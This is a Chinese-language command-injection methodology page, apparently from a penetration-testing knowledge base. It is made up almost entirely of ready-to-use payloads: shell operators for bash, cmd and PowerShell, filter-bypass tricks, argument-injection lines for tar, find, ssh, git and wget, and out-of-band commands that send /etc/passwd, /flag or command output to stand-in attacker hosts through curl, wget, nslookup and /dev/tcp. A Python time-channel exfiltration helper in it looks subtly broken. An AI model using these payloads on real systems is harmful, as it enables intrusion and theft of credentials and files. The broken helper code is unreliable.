# Command Injection — OS 命令注入深度方法论

> 命令注入发生于应用将用户输入拼接到系统命令字符串中并执行时。不同于 SQLi/SSTI 等有明确上下文的注入，命令注入的利用面更宽——Shell 特性本身即武器。

## 关键词

`命令注入` `command injection` `OS injection` `shell injection` `管道符` `拼接符` `换行注入` `盲命令注入` `OOB` `参数注入` `argument injection` `过滤绕过` `编码绕过` `通配符绕过` `空格绕过` `分隔符` `无回显` `dnslog` `shellshock` `IFS` `${IFS}` `$()`

---

## 1. 注入操作符全集

### 1.1 Linux/Unix（sh/bash）

```bash
# ====== 命令分隔与链式执行 ======
; whoami           # 顺序执行（最常用）
| whoami           # 管道输出到命令
|| whoami          # 前命令失败时执行
& whoami           # 后台运行
&& whoami          # 前命令成功时执行
`whoami`           # 反引号命令替换
$(whoami)          # 命令替换（现代写法）
%0awhoami          # 换行符（URL 编码后）
%0d%0awhoami       # CRLF 换行

# ====== 特殊 Shell 特性 ======
whoami\n           # 直接换行（某些 CGI 下）
(xxx; whoami)      # 子 shell 分组
{ xxx; whoami; }   # 花括号分组
<file whoami       # 文件重定向作为命令上下文

# ====== 不常见的分隔符 ======
%09whoami          # 制表符（某些解析器视为分隔）
%0bwhoami          # 垂直制表符
```

### 1.2 Windows（cmd / PowerShell）

```powershell
# cmd.exe
& whoami           # 无条件执行后续
&& whoami          # 成功时执行
|| whoami          # 失败时执行
| whoami           # 管道
%0awhoami          # 换行

# PowerShell
; whoami           # 分号分隔
$(whoami)          # 子表达式
| %{whoami}        # ForEach-Object 注入
```

### 1.3 操作符优先级与组合

```bash
# 利用优先级绕过简单正则过滤
;`whoami`          # 分号 + 命令替换
|$(whoami)         # 管道 + 命令替换
&ping -c 1 `whoami`.dnslog.cn  # 后台 + 命令替换 (OOB)
%0a`id`%0a         # 换行包裹
$(sleep 5)         # 时间盲注用
||$(curl dnslog.cn/$(whoami))  # 失败链 + OOB
```

---

## 2. 探测与回显确认

### 2.1 有回显探测

```bash
# 阶段 1: 确认注入存在
; echo test123       # 观察响应是否出现 test123
| echo test123
$(echo test123)

# 阶段 2: 确认命令执行
; id                  # 观察 uid/gid
; whoami              # 观察用户名
; uname -a            # 观察内核版本
; pwd                 # 当前目录（判断权限）

# 阶段 3: 多命令验证（排除误报）
; echo AAAA; whoami; echo BBBB

# 阶段 4: 全输出捕获
; command 2>&1        # 合并 stderr 到 stdout
; command | base64    # base64 避免特殊字符乱码
; command | xxd -p    # hex 输出
```

### 2.2 无回显（Blind）探测

```bash
# ====== 时间延迟 ======
; sleep 5             # 响应延迟 5 秒 → 确认执行
; ping -c 5 127.0.0.1 # 5 次 ping 约 5 秒
| sleep 5

# ====== OOB (Out-of-Band) — DNS ======
; nslookup $(whoami).attacker-dnslog.cn
; curl http://attacker-dnslog.cn/$(whoami)
; wget http://attacker-dnslog.cn/$(hostname)
; ping -c 1 $(whoami).attacker-dnslog.cn
# 多级命令替换
; curl http://log.cn/$(cat /etc/passwd|base64|tr -d '\n'|cut -c1-60)

# ====== OOB — HTTP ======
; curl http://your-server:port/$(command)
; wget -O- http://your-server/$(id|base64)
; python -c "import urllib;urllib.urlopen('http://x/$(cmd)')"

# ====== OOB — ICMP ======
; ping -c 1 -p $(echo -n 'A'|xxd -p) your-ip
# 每次 ping 的 payload 域可携带少量数据

# ====== 文件落地验证 ======
; touch /tmp/pwned_$(date +%s)
# 通过另外的 LFI/文件读取确认文件存在
```

### 2.3 时间信道（延迟编码传数据）

```python
# 将命令输出编码为延迟时长
import time, requests, subprocess

def exfiltrate_char(cmd_idx, char_pos):
    """逐字符通过延迟传出"""
    cmd = f"sleep $(printf '%d' \"'$(cmd|cut -c{char_pos})\")"
    t0 = time.time()
    requests.get(f"http://target/vuln?input=;{cmd}")
    dt = time.time() - t0
    if dt > 0:
        return chr(int(dt))  # 延迟秒数 = ASCII 码
    return None

# 更快的二分法:
# sleep $(( $(printf '%d' "'c") / 10 )) → 延迟 9.9 秒 → c=99
```

---

## 3. 过滤绕过技术

### 3.1 空格绕过

```bash
# 传统空格替代
cat${IFS}file         # IFS = Internal Field Separator(默认空格/制表/换行)
cat$IFS$9file         # $9 强制 IFS 解析
{cat,file}            # 花括号扩展（bash）
cat<file              # 重定向代替空格
cat<>file             # 读写重定向

# 在管道/子 shell 中
X=$'\x20cat\x20file'&&$X    # 十六进制构造空格
X=$'\x20'&&cat${X}file       # 变量存储空格

# 无空格多命令
{echo,test}>/tmp/a   # 无空格写文件
```

### 3.2 关键字/命令名绕过

```bash
# ====== 通配符 (文件系统依赖) ======
/bin/c?t /etc/passwd           # ? 匹配单字符
/bin/c* /etc/passwd             # * 匹配任意
/bin/c[a-z]t /etc/passwd        # 字符类
/???/c?t /???/p?sswd

# ====== 引号变形 ======
c"a"t /etc/passwd               # 双引号内插
c'a't /etc/passwd               # 单引号内插
c\a\t /etc/passwd               # 反斜杠转义
/usr/bin/c""at /etc/passwd

# ====== 变量构造 ======
a=c;b=at; $a$b /etc/passwd      # 变量拼接
a=c;b=at; ${a}${b} /etc/passwd

# ====== 编码执行 ======
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh   # base64 解码后管道
echo "636174202f6574632f706173737764" | xxd -r -p | sh  # hex 解码
printf "\x63\x61\x74\x20\x2f\x65\x74\x63" | sh  # 十六进制转义
$'\x63\x61\x74' /etc/passwd                     # Bash ANSI-C quoting

# ====== 环境变量利用 ======
$PWD          # /var/www/html
echo ${PWD:0:1}  # "/"
# 用环境变量的字符位拼接出命令
```

### 3.3 特殊字符过滤绕过

```bash
# ====== 斜杠 / 被过滤 ======
cat ${HOME:0:1}etc${HOME:0:1}passwd    # 从 $HOME=/root 取第一个字符 /
cat $(echo . | tr '!-/' '.-/')etc/     # tr 变换字符

# ====== 分号 ; 被过滤 ======
%0a 换行代替
| 管道代替
&& 逻辑与代替
|| 逻辑或代替

# ====== $ 被过滤 (不能命令替换) ======
# 但可能仍可用反引号
`whoami`

# ====== 管道 | 被过滤 ======
# 使用 > 重定向链
cmd1 > /tmp/out; cmd2 < /tmp/out
# 使用反引号嵌套
cmd2 `cmd1`
```

### 3.4 黑名单关键字绕过

```bash
# cat 被过滤
/bin/more /etc/passwd
/bin/less /etc/passwd
head -n 100 /etc/passwd
tail -n 100 /etc/passwd
tac /etc/passwd          # 反向 cat
rev /etc/passwd | rev    # 两次反转
strings /etc/passwd
dd if=/etc/passwd
/bin/busybox cat /etc/passwd
nl /etc/passwd           # 带行号输出

# curl / wget 被过滤
python3 -c "import urllib.request;print(urllib.request.urlopen('http://x').read())"
php -r "echo file_get_contents('http://x');"
perl -e "use LWP::Simple;getprint('http://x')"
ruby -e "require'net/http';puts Net::HTTP.get(URI('http://x'))"
/dev/tcp 重定向 (bash built-in): exec 3<>/dev/tcp/attacker.com/80; echo -e "GET / HTTP/1.0\n" >&3; cat <&3
```

---

## 4. 参数注入（Argument Injection）

参数注入发生在攻击者控制的是现有命令的**参数**而非整个命令时。

### 4.1 核心思路

```bash
# 假设应用执行: /usr/bin/tool --input USER_INPUT --output /tmp/result
# 我们控制 --input 的值

# 注入: --input x --exec "whoami"
# 结果: /usr/bin/tool --input x --exec "whoami" --output /tmp/result
# 工具如果支持 --exec 则执行任意命令

# 通用 fuzz: 在参数位置测试这些标记
--exec whoami
--command whoami
-e whoami
$(whoami)
`whoami`
;whoami
|whoami
```

### 4.2 常见工具的利用

```bash
# ====== tar 参数注入 ======
tar cf archive.tar --checkpoint=1 --checkpoint-action=exec=whoami
# → 打包时执行命令

# ====== find 参数注入 ======
find . -name "*" -exec whoami \;
# → 找到文件时执行命令

# ====== wget 参数注入 ======
wget --post-file=/etc/passwd http://attacker.com
# → POST 本地文件内容

# ====== ssh 参数注入 ======
ssh -o ProxyCommand="whoami" x@x
# → 连接前执行命令

# ====== curl 参数注入 ======
curl -F "file=@/etc/passwd" http://attacker.com
# → 上传本地文件

# ====== git 参数注入 ======
git clone --config core.sshCommand="whoami" repo
# → clone 时执行命令

# ====== 7z / zip 参数注入 ======
7z a a.7z -so '|whoami'
zip -T -TT "whoami" a.zip
```

### 4.3 参数分隔符

```bash
# 利用参数分隔符混淆
argument1%00--exec=whoami    # null byte 终止前一个参数
argument1%20--exec=whoami    # 空格
argument1%0a--exec=whoami    # 换行（某些解析器视为参数分隔）
argument1%09--exec=whoami    # 制表符
```

---

## 5. 进阶注入场景

### 5.1 JSON 上下文注入

```python
# 假设 {"cmd": "ping USER_INPUT"} → os.system("ping " + input)
# 在 JSON 值中注入:
{"cmd": "127.0.0.1; whoami"}
{"cmd": "$(whoami)"}
{"cmd": "127.0.0.1\nwhoami"}
{"cmd": "\" && whoami && echo \""}
```

### 5.2 XML/YAML 上下文

```xml
<!-- XML 属性注入 → 某些模板引擎将属性值拼入 shell -->
<host>127.0.0.1; whoami</host>

<!-- YAML deserialization → Python !!python/object -->
!!python/object/apply:os.system ["whoami"]
```

### 5.3 文件名注入

```bash
# 当应用对用户上传的文件名执行操作时
filename="$(whoami).jpg"   # 直接在文件名中注入
filename=";whoami;.jpg"    # 分号分隔
filename="`whoami`.jpg"    # 反引号

# 防御薄弱场景: mv/cp 操作中的文件
# mv uploads/$FILENAME /storage/$FILENAME
# → FILENAME = "x /tmp/; whoami; #"
# → mv uploads/x /tmp/; whoami; # /storage/x
```

### 5.4 邮件注入 → 命令执行

```bash
# sendmail 参数注入
to="user@example.com -be ${run{/usr/bin/whoami}}"
# sendmail -be 模式可执行命令
```

---

## 6. 常用回连验证命令速查

```bash
# ====== 确认执行 ======
ping -c 3 127.0.0.1                # 检测耗时
sleep 5                            # 最可靠的旁信道
touch /tmp/pwn_$(id -u)            # 落地文件（需二次验证）

# ====== OOB 执行确认 ======
curl http://your-server/$(whoami)   # 最简单
wget http://your-server/$(id)       # curl 不存在时的替代
nslookup $(whoami).your-dnslog.cn   # DNS OOB
dig $(hostname).your-dnslog.cn      # nslookup 替代
python3 -c "import os;os.system('wget http://x/'+os.popen('id').read()[:20])"

# ====== 数据外传 ======
curl -X POST http://x/ -d @/etc/passwd          # POST 文件
curl http://x/$(cat /etc/passwd | base64 -w0 | head -c 200)  # GET base64
wget --post-file=/flag http://x/                # wget POST
python3 -c "import requests;requests.post('http://x/',data=open('/flag').read())"
```

---

## 7. 关联技术

- [[01-command-injection]] — 命令注入（本文）
- [[02-webshell]] — webshell 免杀
- [[03-php-disable-functions-bypass]] — PHP 函数禁用绕过
- [[04-reverse-shell-bind]] — 反弹 shell
- [[05-chain-playbook]] — 漏洞→Shell 链
- [[ssti]] — SSTI → RCE
- [[sqli-nosqli]] — SQLi → xp_cmdshell
